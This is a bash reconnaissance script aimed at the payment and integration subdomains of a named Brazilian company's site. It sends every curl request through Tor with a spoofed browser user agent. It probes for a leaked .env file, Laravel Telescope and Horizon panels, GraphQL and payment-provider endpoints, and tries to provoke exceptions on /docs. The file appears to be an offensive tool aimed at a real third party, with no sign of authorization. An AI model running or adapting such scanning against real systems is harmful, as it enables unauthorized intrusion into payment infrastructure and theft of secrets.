#!/usr/bin/env bash
# payment + integration focusconcursos — /docs 500 'track' exception param mining
E=/home/ubuntu/red-team-operator/focusconcursos.com.br/enum
P="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
D=$E/payment.focusconcursos.com.br
D2=$E/integration.focusconcursos.com.br
out=$D/docs_params.txt
: > "$out"
probe(){ # host path method data tag
 h=$1; p=$2; m=$3; d=$4; t=$5
 if [ "$m" = "GET" ]; then
   r=$(curl -sk --proxy "$P" -m 15 -A "$UA" -H 'Accept: application/json' -o "$E/payment.focusconcursos.com.br/$t.out" -w '%{http_code}|%{size_download}' "https://$h/$p" 2>/dev/null)
   b=$(head -c 400 "$E/payment.focusconcursos.com.br/$t.out" | tr '\n' ' ')
   echo "$m https://$h/$p -> $r | $b" >> "$out"
 else
   r=$(curl -sk --proxy "$P" -m 15 -A "$UA" -H 'Content-Type: application/json' -H 'Accept: application/json' -X "$m" ${d:+--data-raw "$d"} -o "$E/payment.focusconcursos.com.br/$t.out" -w '%{http_code}|%{size_download}' "https://$h/$p" 2>/dev/null)
   b=$(head -c 400 "$E/payment.focusconcursos.com.br/$t.out" | tr '\n' ' ')
   echo "$m https://$h/$p data=$d -> $r | $b" >> "$out"
 fi
 sleep 0.25
}
# baseline
probe payment.focusconcursos.com.br "" GET "" k_root
probe payment.focusconcursos.com.br "docs" GET "" k_docs_get
probe payment.focusconcursos.com.br "docs?track=x" GET "" k_docs_track_get
probe payment.focusconcursos.com.br "docs" POST '{"track":"x"}' k_docs_track_post
probe payment.focusconcursos.com.br "docs" POST '{}' k_docs_empty_post
probe payment.focusconcursos.com.br "api" GET "" k_api_get
probe payment.focusconcursos.com.br "checkout" GET "" k_checkout
probe payment.focusconcursos.com.br "invoice" GET "" k_invoice
probe payment.focusconcursos.com.br "webhook" GET "" k_webhook
probe payment.focusconcursos.com.br "iugu" GET "" k_iugu
probe payment.focusconcursos.com.br "mercadopago" GET "" k_mp
probe payment.focusconcursos.com.br "paypal" GET "" k_paypal
probe payment.focusconcursos.com.br "boleto" GET "" k_boleto
probe payment.focusconcursos.com.br "pix" GET "" k_pix
probe payment.focusconcursos.com.br "graphql" GET "" k_graphql
probe payment.focusconcursos.com.br "telescope" GET "" k_telescope
probe payment.focusconcursos.com.br "horizon" GET "" k_horizon
probe payment.focusconcursos.com.br ".env" GET "" k_env
echo "--- integration ---"
probe integration.focusconcursos.com.br "docs" GET "" i_docs_get
probe integration.focusconcursos.com.br "docs?track=x" GET "" i_docs_track
probe integration.focusconcursos.com.br "api" GET "" i_api
probe integration.focusconcursos.com.br "v1/payments" GET "" i_v1pay
probe integration.focusconcursos.com.br "graphql" GET "" i_graphql
echo "--- done ---"
cat "$out"
